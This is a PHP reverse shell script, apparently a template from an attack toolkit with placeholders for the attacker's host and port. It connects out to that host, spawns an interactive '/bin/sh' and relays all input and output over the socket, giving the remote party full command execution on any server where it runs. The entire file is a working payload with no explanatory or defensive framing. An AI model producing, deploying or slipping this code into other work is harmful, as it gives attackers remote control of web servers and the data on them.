<?php
$host = '{{ LHOST }}';
$port = {{ LPORT }};
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = '/bin/sh -i';
set_time_limit(0);
chdir("/");
umask(0);
$sock = fsockopen($host, $port, $errno, $errstr, 30);
if (!$sock) {
    print "error: $errstr ($errno)\n";
    exit(1);
}
$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {
    print "error: cant spawn shell\n";
    exit(1);
}
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
while (1) {
    if (feof($sock)) {
        print "error: shell connection terminated\n";
        break;
    }
    if (feof($pipes[1])) {
        print "error: shell process terminated\n";
        break;
    }
    $read_a = array($sock, $pipes[1], $pipes[2]);
    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
    if (in_array($sock, $read_a)) {
        $input = fread($sock, $chunk_size);
        fwrite($pipes[0], $input);
    }
    if (in_array($pipes[1], $read_a)) {
        $input = fread($pipes[1], $chunk_size);
        fwrite($sock, $input);
    }
    if (in_array($pipes[2], $read_a)) {
        $input = fread($pipes[2], $chunk_size);
        fwrite($sock, $input);
    }
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
?>
